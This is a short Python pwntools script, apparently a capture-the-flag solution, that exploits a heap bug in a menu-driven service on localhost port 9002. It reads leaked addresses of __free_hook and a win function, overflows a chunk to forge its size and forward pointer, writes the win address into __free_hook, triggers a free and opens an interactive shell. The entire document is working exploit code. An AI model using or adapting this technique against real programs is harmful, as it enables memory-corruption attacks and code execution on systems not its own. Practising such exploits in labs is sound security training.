from pwn import *

s = remote('localhost', 9002)

s.recvuntil('<__free_hook>: ')
__free_hook = int(s.recvline()[:-1], 16)
s.recvuntil('<win>: ')
win = int(s.recvline()[:-1], 16)

print('__free_hook:', hex(__free_hook))
print('win:', hex(win))

s.recvuntil('6. ')
s.sendlineafter('> ', '2')
s.send('hoge')
s.sendlineafter('> ', '3')
s.sendlineafter('> ', '1')
s.send(b'a'*0x18 + p64(0x31) + p64(__free_hook))
s.sendlineafter('> ', '2')
s.send('hoge')
s.sendlineafter('> ', '3')
s.sendlineafter('> ', '2')
s.send(p64(win))
s.sendlineafter('> ', '3')

s.interactive()
